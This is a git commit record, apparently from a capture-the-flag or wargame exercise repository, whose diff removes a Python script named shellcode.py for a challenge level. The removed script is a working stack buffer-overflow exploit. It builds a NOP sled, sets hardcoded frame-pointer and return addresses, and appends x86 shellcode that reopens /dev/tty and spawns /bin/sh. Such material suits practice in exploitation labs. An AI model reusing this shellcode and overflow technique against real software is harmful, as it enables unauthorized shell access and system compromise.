e2f5ba4b222a90af190f4faf9f4ddb71cb497a28
S3sc0 <gramgeek01@gmail.com>
2024-07-22 16:11:43 +0100

    prepare level2

--- level2/Resources/shellcode.py
+++
@@ -1,9 +0,0 @@
-import struct
-
-payload = b"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
-nop = b"\x90"*76
-ebp = struct.pack('I', 0xbffff760)
-eip_bp = struct.pack('I', 0x0804853d)
-eip = struct.pack('I', 0xbffff770)
-
-print(nop + ebp + eip_bp + ebp + eip + b"\x90"*32 + payload)
